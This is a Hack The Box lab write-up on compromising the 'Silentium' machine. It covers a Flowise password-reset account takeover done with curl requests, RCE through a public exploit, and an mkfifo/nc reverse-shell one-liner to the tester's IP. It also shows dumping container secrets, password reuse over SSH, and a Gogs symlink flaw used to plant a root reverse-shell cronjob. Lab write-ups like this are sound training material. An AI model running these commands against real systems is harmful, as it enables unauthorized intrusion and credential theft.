
Hello again! We're gonna solve the “Silentium” Hack The Box machine.

## ENUMERATION
Right now, we just know that our machine’s OS is Linux, so we’re going to start by performing some enumeration over the system.

First of all, if we want the web to be detected we have to make a small change in our /etc/hosts file, we are going to add the line:

```
10.129.37.73    silentium.htb
```

Now, we will perform an nmap over the target, this one has the parameter “--min-rate 5000” please PLEASE, NEVER USE THAT PARAMETER IN REAL-LIFE SITUATIONS, otherwise you’ll probably be fired.

```
nmap -sV -0 -Pn -p- --min-rate 5000 10.129.37.73
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-16 11:05 CEST
Nmap scan report for 10.129.37.73
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.13 seconds
```

We just find two open TCP ports: 22 (ssh) and 80 (http).
We can also confirm that we are in front of a Linux 5.0 - 5.14 system. Not much information but it's a good starting point.

Now we navigate to ```http://silentium.htb/``` to find the website of that machine, and we find that "Silentium is an institutional financial firm providing structured lending, private credit, and bespoke capital solutions to qualified counterparties worldwide. "

In the source code we can also see that the webpage is using Tailwind CSS:

```<script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            silent: {
              900: '#121417',
              800: '#1c1f24',
              700: '#2d3239',
              DEFAULT: '#c4a484',
              light: '#fcfaf7',
              muted: '#6b7280'
            }
          }
        }
      }
    }
  </script>
```

And the source of the JavaScript at **/assets/app.js** on this page:

```<script src="/assets/app.js" defer></script>```

We can also find a Loan Calculator, what is probably the ***app.js*** at first sight.

![[Pasted image 20260416111927.png]]

In the team section, Ben is listed as “Head of Financial Systems,” responsible for analytics platforms and capital workflow infrastructure.
This suggests that there is an administrative dashboard? `maybe`

Let's perform some directory listing and fuzzing to see if we can find the raw scripts and other directories in this webpage.

```❯ gobuster dir -u http://silentium.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://silentium.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 0 / 1 (0.00%)
2026/04/16 11:23:03 the server returns a status code that matches the provided options for non existing urls. http://silentium.htb/d5700a47-e142-45f7-8ab2-ac08380232a4 => 200 (Length: 8753). Please exclude the response length or the status code or set the wildcard option.. To continue please exclude the status code or the length
```

Interesting, we have a **fake 200 OK** response from the server, so let's check the length:
```200 (Length: 8753)```

And now we exclude that length from the responses so we can filter the fake 200's 
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://silentium.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          8753
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://silentium.htb/assets/]
```
Anyways, there's only a folder into the webpage and it's `/assets`

Now we will check the app.js code to see if there's something interesting in it.

```// Wait for DOM to load
document.addEventListener("DOMContentLoaded", () => {

  // Navbar scroll behavior
  const nav = document.getElementById("nav");
  window.addEventListener("scroll", () => {
    if (window.scrollY > 60) {
      nav.classList.add("bg-white/95", "backdrop-blur", "shadow-sm");
    } else {
      nav.classList.remove("bg-white/95", "backdrop-blur", "shadow-sm");
    }
  });

  // Calculator logic
  function calc(amount, term, rate = 4.5) {
    const r = rate / 100 / 12;

    // Safety guard
    if (r === 0 || term === 0) return 0;

    return (
      amount * r * Math.pow(1 + r, term)
    ) / (
      Math.pow(1 + r, term) - 1
    );
  }

  const amount = document.getElementById("amount");
  const term = document.getElementById("term");
  const monthly = document.getElementById("monthly");
  const amountLabel = document.getElementById("amountLabel");
  const termLabel = document.getElementById("termLabel");

  function update() {
    const a = Number(amount.value);
    const t = Number(term.value);

    amountLabel.textContent = `$${a.toLocaleString()}`;
    termLabel.textContent = t;
    monthly.textContent = `$${calc(a, t).toFixed(2)}`;
  }

  amount.addEventListener("input", update);
  term.addEventListener("input", update);

  // Initial render
  update();
});
```

The `calc` function implements the amortization formula:
$$M = P \frac{r(1+r)^n}{(1+r)^n - 1}$$
Where: 
- $M$ is the monthly payment. 
- $P$ is the principal amount. 
- $r$ is the monthly interest rate (rate / 12).
- $n$ is the number of months (term).


Moving to some fuzzing: 
```
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" --hw 8753 --hc 301
```
- **-c** To give the output some color.
- **--hw** To hide the "Fake 200" (just in case)
- **--hc 301** After the first fuzzing, 301 codes filled my screen, so i filtered it in the last one.

**RESULTS:**
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://silentium.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                  
=====================================================================

000000067:   200        69 L     239 W      3142 Ch     "staging"                

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

It seems that we have a **staging.silentium.htb**, that's interesting, let's update the /etc/hosts (IMPORTANT) and check it out:

![[Pasted image 20260416115316.png]]

We can see a logging portal, and Flowise, that is an open-source, drag-and-drop user interface (UI) tool used to build customized Large Language Model (LLM) applications and AI agents without coding (thank you, Gemini)

## USER FLAG - EXPLOITATION
Searching "Flowise" in Exploit-DB we can find two listed vulnerabilities:
```
2025-10-31 || Flowise 3.0.4 - Remote Code Execution (RCE)
2024-04-21 || Flowise 1.6.5 - Authentication Bypass
```
Affecting the 3.0.4 and 1.6.5 versions.

Checking the 3.0.4 PoC we can see that the script exploits a SSCI (Server-Side Code Injection) giving us a RCE (Remote Code Execution)

But in order to use this PoC we need a valid password for the user ben@silentium.htb and we DO NOT have one... So sadly this exploit wont work for us.

After trying some PoCs and CVEs, i found that an Account Takeover worked, so i will explain how i did it:
#### CVE-2025-58434:
In version 3.0.5 and earlier, the `forgot-password` endpoint in Flowise returns sensitive information including a valid password reset `tempToken` without authentication or verification. This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a complete account takeover (ATO). This vulnerability applies to both the cloud service (`cloud.flowiseai.com`) and self-hosted/local Flowise deployments that expose the same API.

### Step 1: Identifying the Target
We need a valid email address. Thanks to my preliminary reconnaissance on the Silentium homepage, we already know that ben@silentium.htb is the head of systems. He is our primary target because his account will have the necessary privileges to execute the RCE later on.

### Step 2: Token Request 
When a user forgets their password, the system generates a security token. Normally, this token is kept secret, but in this case, the mistake was made of including it in the server's response.

```
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"user": {"email": "ben@silentium.htb"}}'
```

### Step 3: Change Password
Now that we have the key (tempToken), let's tell the server: “I'm Ben, I have my temporary key, and I want my new password to be 0xWinter123.”

```
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
     -H "Content-Type: application/json" \
     -d '{
       "user": {
         "email": "ben@silentium.htb",
         "tempToken": "SUPERHOT_TOKEN",
         "password": "0xWinter123"
       }
     }'
```

And we have succesfully changed Ben's password!

Now we can use the PoC that we saw on Exploit-DB to get a RCE!
### Step 1: Netcat listening
We have to set a NetCat listener in order to recieve our Reverse Shell:

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
```

Once we have a listener on port `4444`, we can execute our exploit:

```
python flowiserce.py -e ben@silentium.htb -p 0xWinter123 -u http://staging.silentium.htb -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.159 4444 >/tmp/f"
```

It seems that we are in a container, and user ben is not here.

```
cd ..
ls -l
total 60
drwxr-xr-x    1 root     root          4096 Jul 16  2025 bin
drwxr-xr-x    5 root     root           340 Apr 16 09:01 dev
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 etc
drwxr-xr-x    1 root     root          4096 Jul 16  2025 home
drwxr-xr-x    1 root     root          4096 Jul 15  2025 lib
drwxr-xr-x    5 root     root          4096 Jul 15  2025 media
drwxr-xr-x    2 root     root          4096 Jul 15  2025 mnt
drwxr-xr-x    1 root     root          4096 Jul 16  2025 opt
dr-xr-xr-x  288 root     root             0 Apr 16 09:01 proc
drwx------    1 root     root          4096 Apr  8 09:41 root
drwxr-xr-x    3 root     root          4096 Jul 15  2025 run
drwxr-xr-x    2 root     root          4096 Jul 15  2025 sbin
drwxr-xr-x    2 root     root          4096 Jul 15  2025 srv
dr-xr-xr-x   13 root     root             0 Apr 16 09:01 sys
drwxrwxrwt    1 root     root          4096 Apr 16 10:34 tmp
drwxr-xr-x    1 root     root          4096 Apr  8 09:41 usr
drwxr-xr-x    1 root     root          4096 Jul 15  2025 var
cd home
ls
node
cd node
ls
ls -al
total 8
drwxr-sr-x    2 node     node          4096 Jul 16  2025 .
drwxr-xr-x    1 root     root          4096 Jul 16  2025 ..
cd ..
ls -al
total 12
drwxr-xr-x    1 root     root          4096 Jul 16  2025 .
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
drwxr-sr-x    2 node     node          4096 Jul 16  2025 node
```

Also, we have a very limited shell, we have to perform some lateral movement.
In order to get a more stable shell we will execute the following commands:
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

Not the most attractive shell but it will work

```
/ # ^[[52;5Rls -l
ls -l
total 64
drwxr-xr-x    1 root     root          4096 Jul 16  2025 bin
drwxr-xr-x    5 root     root           340 Apr 16 09:01 dev
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 etc
drwxr-xr-x    1 root     root          4096 Jul 16  2025 home
drwxr-xr-x    1 root     root          4096 Jul 15  2025 lib
drwxr-xr-x    5 root     root          4096 Jul 15  2025 media
drwxr-xr-x    2 root     root          4096 Jul 15  2025 mnt
drwxr-xr-x    1 root     root          4096 Jul 16  2025 opt
dr-xr-xr-x  290 root     root             0 Apr 16 09:01 proc
drwx------    1 root     root          4096 Apr  8 09:41 root
drwxr-xr-x    3 root     root          4096 Jul 15  2025 run
drwxr-xr-x    2 root     root          4096 Jul 15  2025 sbin
drwxr-xr-x    2 root     root          4096 Jul 15  2025 srv
dr-xr-xr-x   13 root     root             0 Apr 16 09:01 sys
drwxrwxrwt    1 root     root          4096 Apr 16 10:34 tmp
drwxr-xr-x    1 root     root          4096 Apr  8 09:41 usr
drwxr-xr-x    1 root     root          4096 Jul 15  2025 var
/ # ^[[52;5R
```

Anyways our goal here is to escape the container:

### Escaping the Container

```
/ # ^[[52;5Rcat /proc/1/environ | tr '\0' '\n'
cat /proc/1/environ | tr '\0' '\n'
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=1
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
/ # ^[[52;5R]
```

Analyzing the output we have two interesting credentials:
```
FLOWISE_PASSWORD=F1l3_d0ck3r
```
and
```
SMTP_PASSWORD=r04D!!_R4ge
```

I tried both passwords and the `SMTP_PASSWORD` matched with ben's password in SSH! That's why you should never reuse credentials in critical environments.

```
ben@10.129.37.120's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Apr 16 10:58:58 AM UTC 2026

  System load:           0.02
  Usage of /:            82.8% of 13.37GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             261
  Users logged in:       0
  IPv4 address for eth0: 10.129.37.120
  IPv6 address for eth0: dead:beef::250:56ff:fe94:952e

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$ ls -l
total 4
-rw-r----- 1 root ben 33 Apr 16 10:53 user.txt
ben@silentium:~$ cat user.txt
```

And now we successfully found the user flag! 

## PRIVILEGE ESCALATION - POST-EXPLOITATION

First, let's check what `sudo` permissions Ben has on the system.

```
ben@silentium:~$ sudo -l                                                                 
[sudo] password for ben: 
Sorry, user ben may not run sudo on silentium.
ben@silentium:~$ 
```
Nothing! Ok, let's move on.


Let's check the SUID:

```
ben@silentium:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
ben@silentium:~$ 
```

And the Cron Jobs:
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
ben@silentium:~$ ls -la /etc/cron.d/
total 20
drwxr-xr-x   2 root root 4096 Feb 16  2025 .
drwxr-xr-x 114 root root 4096 Apr  8 12:02 ..
-rw-r--r--   1 root root  201 Apr  8  2024 e2scrub_all
-rw-r--r--   1 root root  102 Feb 16  2025 .placeholder
-rw-r--r--   1 root root  396 Feb 16  2025 sysstat
```

Also, let's check the Kernel version:
```
ben@silentium:~$ uname -a
Linux silentium 6.8.0-107-generic #107-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 13 19:51:50 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
```

Well, let's also check for interesting proccesses:
```
ben@silentium:~$ netstat -tulnp | grep 127.0.0.1
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34793         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -               
```

We've found something interesting here. That process on port 3001 seems a bit fishy, so we're going to set up port forwarding to check it out.

In a new terminal we will do:
```
❯ ssh -L 9000:127.0.0.1:3001 ben@10.129.37.120
ben@10.129.37.120's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
```

And now we type ben's password and we will be logged again as ben. OK! Tunneling done!
Now it's time to check what port 3001 hides:

First of all, we have a Gogs in por 3001 (our 127.0.0.1:9000)

![[Pasted image 20260416131644.png]]

I tried to reuse credentials with the “ben” user, who is listed on Gogs, but it didn't work. What I did do was create my `0xWinter` account and browse around a bit; however, there doesn't seem to be anything other than the “ben” user, or whatever is there is hidden.

Meanwhile, from the SSH session, I looked up the app's location by checking app.ini.
```
ben@silentium:~$ find / -name "app.ini" 2>/dev/null
/opt/gogs/gogs/custom/conf/app.ini
```

This is a very good finding, because now we can check the database configuration, where the users and passwords are stored.
```
ben@silentium:~$ cat /opt/gogs/gogs/custom/conf/app.ini | grep -A 15 "\[database\]"
[database]
TYPE     = sqlite3
PATH     = /opt/gogs/data/gogs.db
HOST     = 127.0.0.1:5432
NAME     = gogs
SCHEMA   = public
USER     = gogs
PASSWORD = 
SSL_MODE = disable

[repository]
ROOT_PATH      = /root/gogs-repositories
DEFAULT_BRANCH = master
ROOT           = /root/gogs-repositories

[session]
ben@silentium:~$ 
```

AND WE CAN SEE SOMETHING VERY INTERESTING! 
Look: ``` ROOT_PATH      = /root/gogs-repositories ```
That means that the Gogs service is running under ROOT PERMISSIONS.
```
ben@silentium:~$ ls -l /opt/gogs/data/gogs.db
ls: cannot access '/opt/gogs/data/gogs.db': Permission denied
```
Just as I thought, Ben doesn't have permission here.

I spent a while here trying to figure out how to get in until I realized I could use a Git Hooks RCE

### CVE-2025-8110
*According to NIST, I quote: “Improper handling of symbolic links in the Gogs PutContents API allows for local code execution.”*

Since Gogs runs as root, we’re going to use a legitimate Git feature to gain an admin shell. Git hooks are scripts that run on the server when a specific event occurs (such as a push).
Now, the account we did earlier is going to come in handy.

Being completely honest, the original `CVE-2025-8110.py` didn't worked for me, so i had to modify it with AI to help me with coding due to my lack in knowledge of python, but i ended up making it work.

Unfortunately, it wouldn't do any good to share it since the variables are hardcoded right into the code itself (yeah, it's a bit sloppy, but I was feeling a little frustrated at that point)

### How does the script work?
The Python script automates a critical directory traversal and symlink vulnerability within Gogs to achieve root command execution. Here is the step-by-step technical logic:

- **Authentication & API Token:** The script authenticates as a valid user and generates an API token, bypassing web forms to interact directly with the Gogs backend.
- **Malicious Symlink Creation:** It creates a new, empty repository. Locally, it generates an absolute symlink named `malicious_link` pointing directly to the host's system file: `/etc/crontab`. This symlink is pushed to the server.
- **API Abuse & File Overwrite:** The script uses the Gogs API (`PUT /api/v1/repos/.../contents/malicious_link`) to update the file with a reverse shell cronjob payload.
- **The Vulnerability:** Gogs fails to check if the target is a symlink before writing. When the API attempts to save the new content, the underlying Linux OS follows the symlink, writing the malicious cronjob directly into the real `/etc/crontab` file outside the restricted repository path.
- **The 500 Error & Execution:** After writing the file, Gogs attempts to run `git commit` internally. Because the symlink metadata hasn't changed, Git returns an error, causing Gogs to crash and return an HTTP 500 (or 201) status. However, the damage is already done at the OS level. Within 60 seconds, the system's cron daemon executes the injected task as `root`, sending the reverse shell.

### Meanwhile in our NetCat Listener
```
❯ python3 CVE-2025-8110.py 10.10.17.159 4444
[*] Authenticating to Gogs...
[*] Generating API Token...
[*] Creating repository: pwn_c681a1
[*] Creating and pushing ABSOLUTE Symlink...
[+] Symlink successfully pushed to the server.
[!] Overwriting /etc/crontab via API...
[?] Status code 201. Check your NC just in case.
[*] Wait up to 60 seconds with your Netcat open...
```

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.159] from (UNKNOWN) [10.129.37.120] 51436
bash: cannot set terminal process group (29149): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:~# ls
ls
gogs-repositories
root.txt
root@silentium:~# cat root.txt  
cat root.txt
xoxoxoxoxoxoxoxoxoxoxoxoxoxox
root@silentium:~# 
```

And there we go! the root flag! 
